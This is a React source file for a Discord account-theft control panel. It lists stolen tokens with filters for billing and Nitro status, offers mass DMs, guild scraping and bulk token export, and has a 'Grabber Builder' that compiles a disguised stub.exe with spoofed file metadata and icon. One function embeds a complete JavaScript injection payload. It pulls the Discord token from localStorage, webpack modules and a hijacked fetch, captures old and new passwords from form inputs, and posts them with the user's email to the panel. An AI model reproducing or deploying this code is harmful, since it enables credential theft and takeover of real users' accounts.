import React, { useState, useEffect } from 'react';
import axios from 'axios';
import { Rnd } from 'react-rnd';
import { Shield, CreditCard, Users, Server, Trash2, RefreshCw, X, CheckCircle, AlertOctagon, Key, Settings, Moon, Sun, Monitor, Activity, Globe, Search, Link, LogOut, Copy, FileUp, FileDown, Hammer, Syringe, Cog } from 'lucide-react';

const api = 'http://localhost:8000';

function App() {
  const [accounts, setAccounts] = useState([]);
  const [activeWindows, setActiveWindows] = useState([]);
  const [activeTab, setActiveTab] = useState('dashboard');
  
  const [showAddModal, setShowAddModal] = useState(false);
  const [newToken, setNewToken] = useState('');
  
  const [contextMenu, setContextMenu] = useState(null);
  const [contextView, setContextView] = useState('main');
  
  const [rmWindow, setRmWindow] = useState(null);
  const [showDmWarning, setShowDmWarning] = useState(false);
  const [dmAllMessage, setDmAllMessage] = useState('');
  const [contextAccount, setContextAccount] = useState(null);
  const [gmWindow, setGmWindow] = useState(null); 
  const [pcWindow, setPcWindow] = useState(null); 
  const [cleanerWarning, setCleanerWarning] = useState(false);
  const [friendSearch, setFriendSearch] = useState('');
  const [guildInvite, setGuildInvite] = useState('');
  const [blacklistedGuilds, setBlacklistedGuilds] = useState(JSON.parse(localStorage.getItem('guild_blacklist') || '[]'));
  const [showBlacklistGui, setShowBlacklistGui] = useState(false);
  const [newBlacklistId, setNewBlacklistId] = useState('');
  const [toast, setToast] = useState(null);

  const [search, setSearch] = useState('');
  const [filterBilling, setFilterBilling] = useState(null); 
  const [filterNitro, setFilterNitro] = useState(null);
  const [filterStatus, setFilterStatus] = useState(null);
  const [minFriends, setMinFriends] = useState('');
  const [minGuilds, setMinGuilds] = useState('');
  const [filterOwnsGuilds, setFilterOwnsGuilds] = useState(null); 
  const [sortBy, setSortBy] = useState('default');
  const [showFilters, setShowFilters] = useState(false);

  const [showSettings, setShowSettings] = useState(false);
  const [webhookUrl, setWebhookUrl] = useState('');
  const [proxyMode, setProxyMode] = useState(false);
  const [autoRefreshInterval, setAutoRefreshInterval] = useState('0');

  const [proxiesList, setProxiesList] = useState(JSON.parse(localStorage.getItem('discord_proxies') || '[]'));
  const [showProxiesGui, setShowProxiesGui] = useState(false);
  const [newProxiesRaw, setNewProxiesRaw] = useState('');

  const [selectedTokens, setSelectedTokens] = useState([]);

  const [showExportModal, setShowExportModal] = useState(false);
  const [exportRawTokenOnly, setExportRawTokenOnly] = useState(false);

  const [showAssemblyInfo, setShowAssemblyInfo] = useState(false);
  const [assemblyInfo, setAssemblyInfo] = useState({
    file_description: "",
    file_version: "1.0.0.0",
    product_name: "",
    product_version: "1.0.0.0",
    company_name: "",
    legal_copyright: "",
    original_filename: "stub.exe",
    internal_name: "stub"
  });
  const [selectedIcon, setSelectedIcon] = useState(null);
  const [iconPreview, setIconPreview] = useState(null);

  const [configWebhookUrl, setConfigWebhookUrl] = useState(localStorage.getItem('discord_webhook') || '');
  const [webhookNotificationsEnabled, setWebhookNotificationsEnabled] = useState(!!localStorage.getItem('discord_webhook'));
  const [webhookUrlBlurred, setWebhookUrlBlurred] = useState(true);

  useEffect(() => {
    fetchAccounts();
    const closeMenu = () => setContextMenu(null);
    window.addEventListener('click', closeMenu);
    return () => window.removeEventListener('click', closeMenu);
  }, []);

  useEffect(() => {
    let interval = null;
    const mins = parseInt(autoRefreshInterval);
    if(mins > 0) interval = setInterval(() => { fetchAccounts(); }, mins * 60000);
    return () => clearInterval(interval);
  }, [autoRefreshInterval]);

  const logToWebhook = async (title, description, color=5814783) => {
    if(!configWebhookUrl) return;
    try {
        await axios.post(configWebhookUrl, {
            embeds: [{ title, description, color, timestamp: new Date().toISOString() }]
        });
    } catch(e) {}
  };

  const compileAndDownloadExe = async () => {
    try {
      setToast({ type: 'success', msg: 'Compiling C++ payload...' });
      
      const compileRequest = {
        assembly_info: assemblyInfo,
        icon_data: iconPreview
      };
      
      const compileRes = await axios.post(`${api}/builder/compile`, compileRequest);
      if (compileRes.data.status !== 'success') {
        throw new Error('Compilation failed');
      }
      
      setToast({ type: 'success', msg: 'Compilation successful! Downloading...' });
      
      const downloadRes = await axios.get(`${api}/builder/download`, {
        responseType: 'blob'
      });
      
      const blob = new Blob([downloadRes.data], { type: 'application/octet-stream' });
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = assemblyInfo.original_filename || 'stub.exe';
      a.click();
      URL.revokeObjectURL(url);
      
      setToast({ type: 'success', msg: `${assemblyInfo.original_filename || 'stub.exe'} downloaded successfully!` });
      setTimeout(() => setToast(null), 3000);
      
    } catch (error) {
      console.error('Compilation/download error:', error);
      setToast({ 
        type: 'error', 
        msg: error.response?.data?.detail || 'Failed to compile or download executable. Make sure g++ is installed.' 
      });
      setTimeout(() => setToast(null), 5000);
    }
  };

  const handleIconUpload = (e) => {
    const file = e.target.files[0];
    if (!file) return;
    
    if (!file.name.toLowerCase().endsWith('.ico')) {
      setToast({ type: 'error', msg: 'Please upload an ICO file for the icon.' });
      setTimeout(() => setToast(null), 3000);
      return;
    }
    
    const reader = new FileReader();
    reader.onload = (event) => {
      const base64 = event.target.result.split(',')[1];
      setIconPreview(base64);
      setSelectedIcon(file);
      setToast({ type: 'success', msg: 'Icon uploaded successfully!' });
      setTimeout(() => setToast(null), 2000);
    };
    reader.readAsDataURL(file);
  };

  const saveConfig = async () => {
    if (webhookNotificationsEnabled && configWebhookUrl) {
        localStorage.setItem('discord_webhook', configWebhookUrl);
    } else if (!webhookNotificationsEnabled) {
        localStorage.removeItem('discord_webhook');
    }
    
    localStorage.setItem('auto_refresh_interval', autoRefreshInterval);
    setAutoRefreshInterval(autoRefreshInterval);
    
    setToast({ type: 'success', msg: 'Configuration saved!' });
    setTimeout(() => setToast(null), 2000);
  };

  const saveInjectionPayload = async () => {
    try {
      await axios.post(`${api}/injection/save`, { code: "// Discord Injection Payload - Panel Only\n(function() {\n    'use strict';\n    \n    // Configuration\n    const PANEL_API = 'http://localhost:8000';\n    const CHECK_INTERVAL = 1000;\n    \n    // State tracking\n    let currentPassword = '';\n    let currentToken = '';\n    let userData = {};\n    let isMonitoring = false;\n    \n    // Get Discord user data\n    function getUserData() {\n        try {\n            // Try to get user data from various Discord locations\n            const userStore = webpackJsonp.push([[], {}, r => r]).c;\n            const modules = Object.keys(userStore);\n            \n            for (const module of modules) {\n                const mod = userStore[module].exports;\n                if (mod && mod.default && mod.default.getUser) {\n                    const user = mod.default.getCurrentUser();\n                    if (user) {\n                        return {\n                            id: user.id,\n                            username: user.username,\n                            discriminator: user.discriminator,\n                            avatar: user.avatarURL || `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png`,\n                            email: user.email || 'N/A'\n                        };\n                    }\n                }\n            }\n            \n            // Fallback method\n            const userElement = document.querySelector('[data-user-id]');\n            if (userElement) {\n                return {\n                    id: userElement.getAttribute('data-user-id'),\n                    username: 'Unknown',\n                    discriminator: '0000',\n                    avatar: 'https://cdn.discordapp.com/embed/avatars/0.png',\n                    email: 'N/A'\n                };\n            }\n        } catch (e) {\n            console.log('Error getting user data:', e);\n        }\n        \n        return {\n            id: 'Unknown',\n            username: 'Unknown',\n            discriminator: '0000',\n            avatar: 'https://cdn.discordapp.com/embed/avatars/0.png',\n            email: 'N/A'\n        };\n    }\n    \n    // Get current Discord token\n    function getDiscordToken() {\n        try {\n            // Method 1: LocalStorage\n            const token = localStorage.getItem('token');\n            if (token) return token;\n            \n            // Method 2: Webpack\n            try {\n                const webpackExports = webpackJsonp.push([[], {}, e => e]).c;\n                for (const id in webpackExports) {\n                    const module = webpackExports[id].exports;\n                    if (module && module.default && module.default.getToken) {\n                        return module.default.getToken();\n                    }\n                }\n            } catch (e) {}\n            \n            // Method 3: Request intercept\n            const originalFetch = window.fetch;\n            window.fetch = function(...args) {\n                const [url, options] = args;\n                if (url.includes('/api/v9/users/@me') && options && options.headers) {\n                    const authHeader = options.headers['authorization'] || options.headers['Authorization'];\n                    if (authHeader) {\n                        currentToken = authHeader.replace('Bot ', '').replace('Bearer ', '');\n                        window.fetch = originalFetch; // Restore original fetch\n                        return currentToken;\n                    }\n                }\n                return originalFetch.apply(this, args);\n            };\n        } catch (e) {\n            console.log('Error getting token:', e);\n        }\n        \n        return '';\n    }\n    \n    // Create injection card in panel\n    async function createInjectionCard(userData, token, type, oldPassword = null, newPassword = null) {\n        try {\n            const cardData = {\n                username: userData.username,\n                discriminator: userData.discriminator,\n                user_id: userData.id,\n                email: userData.email,\n                avatar: userData.avatar,\n                token: token,\n                event_type: type,\n                timestamp: new Date().toISOString()\n            };\n            \n            // Add passwords if it's a password change\n            if (type === 'password_change') {\n                cardData.old_password = oldPassword;\n                cardData.new_password = newPassword;\n            }\n            \n            const response = await fetch(`${PANEL_API}/injections/create`, {\n                method: 'POST',\n                headers: {\n                    'Content-Type': 'application/json',\n                },\n                body: JSON.stringify(cardData)\n            });\n            \n            if (response.ok) {\n                console.log(`✅ Injection card created in panel successfully (${type})`);\n            } else {\n                console.log('⚠️ Failed to create injection card in panel');\n            }\n        } catch (e) {\n            console.log('❌ Error creating injection card in panel:', e);\n        }\n    }\n    \n    // Monitor password changes\n    function monitorPasswordChanges() {\n        if (isMonitoring) return;\n        isMonitoring = true;\n        \n        console.log('🔍 Starting password change monitoring...');\n        \n        // Monitor for password change modal/panel\n        const observer = new MutationObserver((mutations) => {\n            mutations.forEach((mutation) => {\n                mutation.addedNodes.forEach((node) => {\n                    if (node.nodeType === Node.ELEMENT_NODE) {\n                        // Look for password change forms\n                        const passwordInputs = node.querySelectorAll ? \n                            node.querySelectorAll('input[type=\"password\"]') : [];\n                        \n                        passwordInputs.forEach(input => {\n                            if (!input.hasAttribute('data-injection-monitored')) {\n                                input.setAttribute('data-injection-monitored', 'true');\n                                \n                                // Monitor input changes\n                                input.addEventListener('input', () => {\n                                    const value = input.value;\n                                    if (value.length > 0) {\n                                        if (!currentPassword) {\n                                            currentPassword = value;\n                                        } else if (value !== currentPassword) {\n                                            // Password changed\n                                            const oldPassword = currentPassword;\n                                            const newPassword = value;\n                                            \n                                            // Get new token after password change\n                                            setTimeout(() => {\n                                                const newToken = getDiscordToken();\n                                                const updatedUserData = getUserData();\n                                                \n                                                // Create injection card in panel\n                                                createInjectionCard(updatedUserData, newToken, 'password_change', oldPassword, newPassword);\n                                                \n                                                currentPassword = newPassword;\n                                                currentToken = newToken;\n                                            }, 2000);\n                                        }\n                                    }\n                                });\n                            }\n                        });\n                        \n                        // Look for submit buttons in password change forms\n                        const submitButtons = node.querySelectorAll ? \n                            node.querySelectorAll('button[type=\"submit\"], button[tabindex=\"0\"]') : [];\n                        \n                        submitButtons.forEach(button => {\n                            if (!button.hasAttribute('data-injection-monitored')) {\n                                button.setAttribute('data-injection-monitored', 'true');\n                                \n                                button.addEventListener('click', () => {\n                                    // Check if this is a password change submission\n                                    const form = button.closest('form');\n                                    if (form) {\n                                        const passwordInputs = form.querySelectorAll('input[type=\"password\"]');\n                                        if (passwordInputs.length >= 2) {\n                                            // Likely a password change form (old + new + confirm)\n                                            setTimeout(() => {\n                                                const newToken = getDiscordToken();\n                                                const updatedUserData = getUserData();\n                                                \n                                                // Create injection card in panel\n                                                createInjectionCard(updatedUserData, newToken, 'password_change', currentPassword || 'Captured', 'Password Changed');\n                                                \n                                                currentToken = newToken;\n                                            }, 3000);\n                                        }\n                                    }\n                                });\n                            }\n                        });\n                    }\n                });\n            });\n        });\n        \n        // Start observing\n        observer.observe(document.body, {\n            childList: true,\n            subtree: true\n        });\n        \n        // Initial data capture\n        setTimeout(() => {\n            userData = getUserData();\n            currentToken = getDiscordToken();\n            \n            if (currentToken && userData.id !== 'Unknown') {\n                // Create injection card in panel\n                createInjectionCard(userData, currentToken, 'login');\n            }\n        }, 3000);\n    }\n    \n    // Initialize\n    function init() {\n        // Wait for Discord to load\n        if (document.readyState === 'loading') {\n            document.addEventListener('DOMContentLoaded', init);\n            return;\n        }\n        \n        // Wait a bit more for Discord's React components\n        setTimeout(() => {\n            monitorPasswordChanges();\n        }, 2000);\n    }\n    \n    // Start the injection\n    init();\n    \n    console.log('🚀 Discord Injection Payload Loaded - Panel only mode');\n})();" });
      
      setToast({ type: 'success', msg: 'Injection code saved! Available at /js-injection.js' });
      setTimeout(() => setToast(null), 3000);
    } catch (e) {
      console.error('Save error:', e);
      setToast({ type: 'error', msg: `Failed to save: ${e.response?.data?.detail || e.message}` });
      setTimeout(() => setToast(null), 3000);
    }
  };

  const fetchAccounts = async () => {
    try {
      const res = await axios.get(`${api}/accounts`);
      setAccounts(res.data);
    } catch (e) {
      console.error(e);
    }
  };

  const addAccount = async () => {
    if (!newToken.trim()) return;
    try {
      await axios.post(`${api}/add_account`, { token: newToken });
      logToWebhook('New Token Added', `A new token was injected.`, 5763719);
      setNewToken('');
      setShowAddModal(false);
      fetchAccounts();
    } catch (e) {
      setToast({ type: 'error', msg: "Invalid or expired token injected!" });
      setTimeout(() => setToast(null), 3000);
    }
  };

  const removeAccount = async (id) => {
    try {
      await axios.delete(`${api}/remove/${id}`);
      setActiveWindows(activeWindows.filter(w => w.id !== id));
      logToWebhook('Token Removed', `Token ID ${id} was removed.`, 15548997);
      fetchAccounts();
    } catch (e) {
      console.error(e);
    }
  };

  const removeInvalidTokens = async () => {
      const invalids = accounts.filter(a => !a.valid);
      if(!invalids.length) return setToast({type: 'error', msg: 'No invalid tokens found.'});
      setToast({type: 'success', msg: `Removing ${invalids.length} tokens...`});
      await Promise.allSettled(invalids.map(async a => axios.delete(`${api}/remove/${a.id}`)));
      logToWebhook('Invalid Tokens Removed', `Removed ${invalids.length} invalid tokens.`, 15548997);
      fetchAccounts();
      setToast({type: 'success', msg: `Removed ${invalids.length} invalid tokens.`});
      setTimeout(() => setToast(null), 3000);
  };

  const removeSelectedTokens = async () => {
      if(!selectedTokens.length) return;
      setToast({type: 'success', msg: `Removing ${selectedTokens.length} tokens...`});
      await Promise.allSettled(selectedTokens.map(async id => axios.delete(`${api}/remove/${id}`)));
      logToWebhook('Selected Tokens Removed', `Removed ${selectedTokens.length} specifically selected tokens.`, 15548997);
      setSelectedTokens([]);
      fetchAccounts();
      setToast({type: 'success', msg: `Removed selected tokens.`});
      setTimeout(() => setToast(null), 3000);
  };

  const addToBlacklist = () => {
     if(!newBlacklistId.trim()) return;
     const idList = newBlacklistId.split(',').map(i=>i.trim()).filter(i=>i);
     const newList = [...new Set([...blacklistedGuilds, ...idList])];
     setBlacklistedGuilds(newList);
     localStorage.setItem('guild_blacklist', JSON.stringify(newList));
     setNewBlacklistId('');
     setToast({type: 'success', msg: `Added ${idList.length} guild(s) to blacklist.`});
     logToWebhook('Blacklist Updated', `Added ${idList.length} guilds to blacklist.`, 15548997);
     setTimeout(() => setToast(null), 3000);
  };
  
  const removeFromBlacklist = (id) => {
     const newList = blacklistedGuilds.filter(g => g !== id);
     setBlacklistedGuilds(newList);
     localStorage.setItem('guild_blacklist', JSON.stringify(newList));
     setToast({type: 'success', msg: 'Guild removed from blacklist.'});
     setTimeout(() => setToast(null), 3000);
  };

  const runGlobalBlacklister = async () => {
     if(!blacklistedGuilds.length) return;
     setToast({type: 'success', msg: 'Running Global Blacklister in background...'});
     let actions = 0;
     for(let acc of accounts) {
         if(acc.guilds && acc.guilds.length > 0) {
             for(let g of acc.guilds) {
                 if(blacklistedGuilds.includes(g.id)) {
                     try {
                         await axios.post(`${api}/guilds/${acc.id}/leave/${g.id}`);
                         actions++;
                     } catch(e){}
                 }
             }
         }
     }
     if(actions > 0) fetchAccounts();
     logToWebhook('Global Blacklister Finished', `Successfully left ${actions} blacklisted matching guilds across all accounts.`, 15548997);
     setToast({type: 'success', msg: `Blacklister executed. Left ${actions} matching guilds.`});
     setTimeout(() => setToast(null), 4000);
  };

  const refreshAccount = async (id) => {
    try {
      await axios.post(`${api}/refresh/${id}`);
      fetchAccounts();
      const res = await axios.get(`${api}/accounts`);
      const newData = res.data;
      setAccounts(newData);
      const accData = newData.find(a => a.id === id);
      setActiveWindows(prev => 
        prev.map(win => win.id === id ? { ...win, data: accData } : win)
      );
      setRmWindow(prev => (prev && prev.id === id) ? accData : prev);
      setGmWindow(prev => (prev && prev.id === id) ? accData : prev);
    } catch (e) {
      console.error(e);
    }
  };
  
  const handleAction = async (id, action, value) => {
    try {
      await axios.post(`${api}/action/${id}`, { action, value });
    } catch (e) {
      console.error("Action failed", e);
    }
  };

  const openWindow = (account) => {
    if (activeWindows.find(w => w.id === account.id)) return;
    setActiveWindows([...activeWindows, { id: account.id, data: account, zIndex: activeWindows.length + 10 }]);
  };

  const closeWindow = (id) => setActiveWindows(activeWindows.filter(w => w.id !== id));
  
  const bringToFront = (id) => {
    setActiveWindows(prev => {
      const highestZ = Math.max(...prev.map(w => w.zIndex || 10), 10);
      return prev.map(w => w.id === id ? { ...w, zIndex: highestZ + 1 } : w);
    });
  };

  const handleContextMenu = (e, account) => {
    e.preventDefault();
    setContextMenu({ mouseX: e.clientX, mouseY: e.clientY, accountId: account.id, account: account });
    setContextView('main');
  };
  
  const blockUser = async (baseAccId, targetId) => {
     try {
         await axios.post(`${api}/relationships/${baseAccId}/block/${targetId}`);
         setToast({ type: 'success', msg: "Target blocked successfully." });
         setTimeout(() => setToast(null), 3000);
     } catch (e) {
         setToast({ type: 'error', msg: "Failed to issue block." });
         setTimeout(() => setToast(null), 3000);
     }
  };
  
  const joinGuild = async (baseAccId) => {
     if(!guildInvite) return;
     try {
         await axios.post(`${api}/guilds/${baseAccId}/join`, { invite_link: guildInvite });
         setToast({ type: 'success', msg: "Joined guild successfully." });
         setGuildInvite('');
         setTimeout(() => setToast(null), 3000);
         refreshAccount(baseAccId);
     } catch (e) {
         setToast({ type: 'error', msg: e.response?.data?.detail || "Failed to join guild." });
         setTimeout(() => setToast(null), 3000);
     }
  };

  const leaveGuild = async (baseAccId, guildId) => {
     try {
         await axios.post(`${api}/guilds/${baseAccId}/leave/${guildId}`);
         setToast({ type: 'success', msg: "Left guild successfully." });
         setTimeout(() => setToast(null), 3000);
         refreshAccount(baseAccId);
     } catch (e) {
         setToast({ type: 'error', msg: e.response?.data?.detail || "Failed to leave guild." });
         setTimeout(() => setToast(null), 3000);
     }
  };
  
  const dispatchDm = async (baseAccId, targetId, msg) => {
      try {
         await axios.post(`${api}/relationships/${baseAccId}/dm/${targetId}`, { message: msg });
         setToast({ type: 'success', msg: "Message sent." });
         setTimeout(() => setToast(null), 3000);
      } catch (e) {
         setToast({ type: 'error', msg: "Failed to dispatch message." });
      }
  };

  const startTokenCleaner = async () => {
    if(!contextAccount) return;
    try {
        await axios.post(`${api}/cleaner/${contextAccount.id}`);
        setToast({ type: 'success', msg: "Cleaner task started." });
        setCleanerWarning(false);
        setTimeout(() => setToast(null), 3000);
    } catch(e) {
        setToast({ type: 'error', msg: "Failed to start cleaner." });
    }
  };

  const scrapeGuild = async (baseAccId) => {
     const promptId = prompt("Enter Guild ID to scrape:");
     if(!promptId) return;
     try {
         const res = await axios.get(`${api}/guilds/${baseAccId}/scrape/${promptId}`);
         setToast({ type: 'success', msg: `Scraped ${res.data.count} members.` });
         setTimeout(() => setToast(null), 3000);
     } catch (e) {
         setToast({ type: 'error', msg: e.response?.data?.detail || "Failed to scrape guild." });
         setTimeout(() => setToast(null), 3000);
     }
  };

  const saveProfile = async (id, payload) => {
     try {
         await axios.patch(`${api}/settings/${id}/profile`, payload);
         setToast({ type: 'success', msg: "Profile saved." });
     } catch (e) {
         setToast({ type: 'error', msg: "Failed to save profile." });
     }
  };

  const saveHypeSquad = async (id, house_id) => {
     try {
         await axios.post(`${api}/settings/${id}/hypesquad`, { house_id });
         setToast({ type: 'success', msg: "HypeSquad updated." });
     } catch (e) {
         setToast({ type: 'error', msg: "Failed to update HypeSquad." });
     }
  };

  const sendDmAll = async () => {
    if(!dmAllMessage || !contextAccount) return;
    try {
        await axios.post(`${api}/relationships/${contextAccount.id}/dm_all`, { message: dmAllMessage });
        setToast({ type: 'success', msg: "Mass DM started in background." });
        setDmAllMessage('');
        setShowDmWarning(false);
        setTimeout(() => setToast(null), 3000);
    } catch(e) {
        setToast({ type: 'error', msg: "Failed to start mass DM." });
        setTimeout(() => setToast(null), 3000);
    }
  };

  const verifyAllTokens = async () => {
     setToast({ type: 'success', msg: "Verifying all tokens..." });
     for(let acc of accounts) {
         try {
             await axios.post(`${api}/refresh/${acc.id}`);
         } catch(e) {}
     }
     fetchAccounts();
     setToast({ type: 'success', msg: "All tokens verified." });
     setTimeout(() => setToast(null), 3000);
  };

  const handleImport = (e, type) => {
     const file = e.target.files[0];
     if(!file) return;
     e.target.value = '';
     const reader = new FileReader();
     reader.onload = async (evt) => {
         const content = evt.target.result;
         let tokens = [];
         if(type === 'txt') {
             tokens = content.split('\n').map(t => t.trim()).filter(t => t.length > 20);
         } else if(type === 'json') {
             try { tokens = JSON.parse(content); } catch(err) {}
         }
         
         if(!tokens.length) { setToast({ type: 'error', msg: 'No valid tokens found in file.' }); return; }
         setToast({ type: 'success', msg: `Importing ${tokens.length} tokens...` });
         let success = 0;

         await Promise.allSettled(tokens.map(async t => {
             try {
                 const res = await axios.post(`${api}/add_account`, { token: t });
                 const acc = res.data;
                 setAccounts(prev => {
                     if(prev.find(a => a.id === acc.id)) return prev;
                     return [...prev, {
                         id: acc.id,
                         username: acc.username,
                         avatar: acc.avatar,
                         token: acc.token,
                         valid: acc.valid,
                         billing: acc.billing || [],
                         friends: acc.friends || [],
                         guilds: acc.guilds || [],
                         nitro: acc.nitro || false,
                         status: acc.status_val || 'online'
                     }];
                 });
                 success++;
             } catch(err) {}
         }));

         setTimeout(() => fetchAccounts(), 2000);
         setToast({ type: 'success', msg: `Imported ${success}/${tokens.length} tokens.` });
         setTimeout(() => setToast(null), 4000);
     };
     reader.readAsText(file);
  };

  const exportToTxt = () => {
    const validTokens = filteredAccounts.map(a => a.token).filter(t => t);
    if (!validTokens.length) {
      setToast({ type: 'error', msg: 'No valid tokens to export in current filter.' });
      return;
    }
    const blob = new Blob([validTokens.join('\n')], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'tokens_export.txt';
    a.click();
    URL.revokeObjectURL(url);
    setToast({ type: 'success', msg: `Exported ${validTokens.length} tokens to TXT.` });
    setTimeout(() => setToast(null), 3000);
  };

  const exportToJson = () => {
    if (!filteredAccounts.length) {
      setToast({ type: 'error', msg: 'No accounts to export in current filter.' });
      return;
    }
    const exportData = filteredAccounts.map(a => ({
      username: a.username,
      userid: a.id,
      token: a.token,
      friends_count: a.friends?.length || 0,
      guilds_count: a.guilds?.length || 0,
    }));
    const blob = new Blob([JSON.stringify(exportData, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'accounts_export.json';
    a.click();
    URL.revokeObjectURL(url);
    setToast({ type: 'success', msg: `Exported ${exportData.length} accounts to JSON.` });
    setTimeout(() => setToast(null), 3000);
  };

  const exportToCsv = () => {
    if (!filteredAccounts.length) {
      setToast({ type: 'error', msg: 'No accounts to export in current filter.' });
      return;
    }
    const headers = exportRawTokenOnly ? ['Token'] : ['Username', 'User ID', 'Token', 'Friends Count', 'Guilds Count'];
    const csvData = filteredAccounts.map(a => {
      if (exportRawTokenOnly) {
        return [a.token];
      }
      return [
        a.username || '',
        a.id || '',
        a.token || '',
        a.friends?.length || 0,
        a.guilds?.length || 0
      ];
    });
    
    const csvContent = [
      headers.join(','),
      ...csvData.map(row => row.map(cell => `"${cell}"`).join(','))
    ].join('\n');
    
    const blob = new Blob([csvContent], { type: 'text/csv' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'accounts_export.csv';
    a.click();
    URL.revokeObjectURL(url);
    setToast({ type: 'success', msg: `Exported ${filteredAccounts.length} accounts to CSV.` });
    setTimeout(() => setToast(null), 3000);
  };

  const handleExport = (format) => {
    switch(format) {
      case 'txt':
        exportToTxt();
        break;
      case 'json':
        exportToJson();
        break;
      case 'csv':
        exportToCsv();
        break;
    }
    setShowExportModal(false);
  };

  const filteredAccounts = (() => {
    let list = [...accounts];
    if(search) {
      const q = search.toLowerCase();
      list = list.filter(a => a.username?.toLowerCase().includes(q) || a.id?.includes(q));
    }
    if(filterBilling === true)  list = list.filter(a => a.billing?.length > 0);
    if(filterBilling === false) list = list.filter(a => !a.billing?.length);
    if(filterNitro === true)  list = list.filter(a => a.nitro);
    if(filterNitro === false) list = list.filter(a => !a.nitro);
    if(filterStatus) list = list.filter(a => a.status === filterStatus);
    if(filterOwnsGuilds === true)  list = list.filter(a => a.guilds?.some(g => g.owner));
    if(filterOwnsGuilds === false) list = list.filter(a => !a.guilds?.some(g => g.owner));
    if(minFriends !== '') list = list.filter(a => (a.friends?.length || 0) >= parseInt(minFriends));
    if(minGuilds !== '')  list = list.filter(a => (a.guilds?.length  || 0) >= parseInt(minGuilds));
    switch(sortBy) {
      case 'friends_desc':  list.sort((a,b) => (b.friends?.length||0) - (a.friends?.length||0)); break;
      case 'guilds_desc':   list.sort((a,b) => (b.guilds?.length||0)  - (a.guilds?.length||0));  break;
      case 'billing_desc':  list.sort((a,b) => (b.billing?.length||0) - (a.billing?.length||0)); break;
      case 'nitro_first':   list.sort((a,b) => (b.nitro ? 1 : 0) - (a.nitro ? 1 : 0)); break;
      case 'online_first':  list.sort((a,b) => (b.status==='online'?1:0) - (a.status==='online'?1:0)); break;
      case 'username_asc':  list.sort((a,b) => (a.username||'').localeCompare(b.username||'')); break;
    }
    return list;
  })();

  return (
    <div className="min-h-screen bg-gray-900 text-gray-100 flex overflow-hidden font-sans">
      
      <aside className="w-20 bg-gray-800 border-r border-gray-700 flex flex-col items-center py-6 gap-6 shrink-0 relative z-50 shadow-2xl transition-all">
         <div onClick={() => setActiveTab('dashboard')} className={`p-3 rounded-xl cursor-pointer transition-colors tooltip group relative ${activeTab === 'dashboard' ? 'bg-indigo-600/20 text-indigo-500' : 'bg-gray-700/50 text-gray-400 hover:bg-gray-700 hover:text-gray-200'}`} title="Dashboard">
             <Shield className="w-7 h-7" />
         </div>
         <div onClick={() => setActiveTab('config')} className={`p-3 rounded-xl cursor-pointer transition-colors group relative ${activeTab === 'config' ? 'bg-indigo-600/20 text-indigo-500' : 'bg-gray-700/50 text-gray-400 hover:bg-gray-700 hover:text-gray-200'}`} title="Configuration">
             <Cog className="w-7 h-7" />
             <div className="absolute left-full ml-3 top-1/2 -translate-y-1/2 px-2 py-1 bg-gray-800 border border-gray-700 text-gray-200 text-xs rounded opacity-0 invisible group-hover:opacity-100 group-hover:visible transition-all whitespace-nowrap z-50">Configuration</div>
         </div>
         <div onClick={() => setActiveTab('builder')} className={`p-3 rounded-xl cursor-pointer transition-colors group relative ${activeTab === 'builder' ? 'bg-indigo-600/20 text-indigo-500' : 'bg-gray-700/50 text-gray-400 hover:bg-gray-700 hover:text-gray-200'}`} title="Grabber Builder">
             <Hammer className="w-7 h-7" />
             <div className="absolute left-full ml-3 top-1/2 -translate-y-1/2 px-2 py-1 bg-gray-800 border border-gray-700 text-gray-200 text-xs rounded opacity-0 invisible group-hover:opacity-100 group-hover:visible transition-all whitespace-nowrap z-50">Grabber Builder</div>
         </div>
         <div onClick={() => setActiveTab('injections')} className={`p-3 rounded-xl cursor-pointer transition-colors group relative ${activeTab === 'injections' ? 'bg-indigo-600/20 text-indigo-500' : 'bg-gray-700/50 text-gray-400 hover:bg-gray-700 hover:text-gray-200'}`} title="Injections">
             <Syringe className="w-7 h-7" />
             <div className="absolute left-full ml-3 top-1/2 -translate-y-1/2 px-2 py-1 bg-gray-800 border border-gray-700 text-gray-200 text-xs rounded opacity-0 invisible group-hover:opacity-100 group-hover:visible transition-all whitespace-nowrap z-50">Injections</div>
         </div>
      </aside>

      <div className="flex-1 p-6 overflow-y-auto relative h-screen custom-scrollbar">
        {activeTab === 'dashboard' && (
        <div className="max-w-7xl mx-auto">
        <header className="mb-8 flex justify-between items-center border-b border-gray-800 pb-4">
          <div className="flex items-center gap-3">
            <Shield className="w-8 h-8 text-indigo-500" />
            <h1 className="text-2xl font-bold tracking-tight text-white">Discord Account Manager</h1>
          </div>
          
          <div className="flex gap-3 items-center flex-wrap justify-end">
            {selectedTokens.length > 0 && (
              <button onClick={removeSelectedTokens} className="px-3 py-2 bg-red-600 hover:bg-red-700 text-white rounded-md flex items-center gap-2 transition-colors font-medium text-xs">
                 <Trash2 className="w-4 h-4" /> Delete ({selectedTokens.length})
              </button>
            )}
            <button onClick={removeInvalidTokens} className="px-3 py-2 bg-red-900/40 hover:bg-red-900/60 border border-red-800 text-red-200 rounded-md flex items-center gap-2 transition-colors font-medium text-xs" title="Remove Invalid Tokens">
                <Trash2 className="w-4 h-4" /> Clean
            </button>
            <button onClick={() => setShowProxiesGui(true)} className={`px-3 py-2 hover:bg-gray-700 text-gray-300 border rounded-md flex items-center gap-2 transition-colors font-medium text-xs ${proxyMode ? 'bg-indigo-900 border-indigo-700' : 'bg-gray-800 border-gray-700'}`}>
                <Activity className="w-4 h-4" /> Proxies
            </button>
            <button onClick={() => setShowSettings(true)} className="px-3 py-2 bg-gray-800 hover:bg-gray-700 text-gray-300 border border-gray-700 rounded-md flex items-center gap-2 transition-colors font-medium text-xs">
                <Settings className="w-4 h-4" /> Config
            </button>
            <label className="px-3 py-2 bg-indigo-900/60 border border-indigo-700 hover:bg-indigo-800 text-indigo-100 rounded-md flex items-center gap-2 transition-colors font-medium cursor-pointer text-xs">
                <FileUp className="w-4 h-4"/> Import 
                <input type="file" accept=".txt,.json" className="hidden" onChange={(e) => {
                   if(e.target.files && e.target.files[0] && e.target.files[0].name.endsWith('.json')) handleImport(e, 'json');
